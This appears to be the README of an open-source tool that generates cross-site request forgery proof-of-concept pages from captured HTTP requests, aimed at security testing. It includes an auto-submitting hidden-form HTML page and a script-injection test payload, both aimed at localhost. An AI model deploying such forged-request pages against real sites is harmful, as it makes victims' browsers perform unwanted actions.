# CSRFPoCGenerator
Generate CSRF PoC
![CSRFPoCGenerator screen](https://raw.githubusercontent.com/takubokudori/CSRFPoCGenerator/master/images/CPGscreen.PNG)
---

## Parameters

- send : sending type(Form or XHR)
- use fromCharCode : use fromCharCode (XHR only)
- transition on submit : force Transition on Submit
- automatic submitting : submit when opening HTML file
    - specifiable : specify value HTML page(beta)
- HTTP Request : set raw HTTP Request
- URL : Set URL
- method : Set method
- header :Set HTTP header (XHR only)
- enctype : Select enctype
    - boundary : Set boundary for multipart/form-data
- body : Set HTTP body
- title : Downloadable HTML title

## How to use

Click "analyze" to analyze HTTP request & paste

Click "generate and submit" to generate form & submit request.

Click "generate only" to just generate form.

Click "download HTML" to download CSRF PoC HTML.

## Example

### using HTTP Request

Enter the following value.

```
POST http://localhost/post.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Connection: keep-alive
Cookie: PHPSESSID=PaP2yx9xeWc10XV9mjxBjWb8iu3MmWb6
Upgrade-Insecure-Requests: 1

title=CSRF&name=hello+world&comment=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
```

Then click "analyze" and separate into 5 parameters(URL, method, header, enctype, body).

Then click "download HTML" and download a HTML file.


### using URL method etc...
Enter the following values.

- URL
```
http://localhost/post.php
```

- method
```
POST
```

- enctype
```
application/x-www-form-urlencoded (default)
```

- body
```
title=CSRF&name=hello+world&comment=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
```

Then click "generate only" (or "generate and submit" ) and Output a HTML form (and submit request ).
```
<form target="dummyfrm" name="evilform" action="http://localhost/post.php" method="POST" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="title" value="CSRF" />
<input type="hidden" name="name" value="hello world" />
<input type="hidden" name="comment" value="&lt;script&gt;alert(1);&lt;/script&gt;
" />
</form>
<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>
```

- title
```
Hello CSRF PoC
```

Then click "download HTML" and download a HTML file.

```
<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8">
<title>Hello CSRF PoC</title>
</head>
<body onload="document.evilform.submit();">
<form target="dummyfrm" name="evilform" action="http://localhost/post.php" method="POST" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="title" value="CSRF" />
<input type="hidden" name="name" value="hello world" />
<input type="hidden" name="comment" value="&lt;script&gt;alert(1);&lt;/script&gt;" />
</form>
<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>
<p>Hello CSRF PoC</p>
</body>
</html>
```

---

# Other

## URL encoding

- URLencode : Set string
```
<script>alert(1);</script>
```

Then click "URL encode" and encode input string.
```
%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
```

---

# Change log

v1.6

- added transition on submit

v1.5

- added request header feature (XHR)
- added fromCharCode(XHR)

v1.4

- added raw Request
- added detect boundary
- added an option to specifiable value

v1.3

- added XHR multipart/form-data transmission
- added an option to send automatically
- arbitrary enctype

v1.2

- added XHR mode

v1.1

- added enctype setting
- added download function
- fixed typo

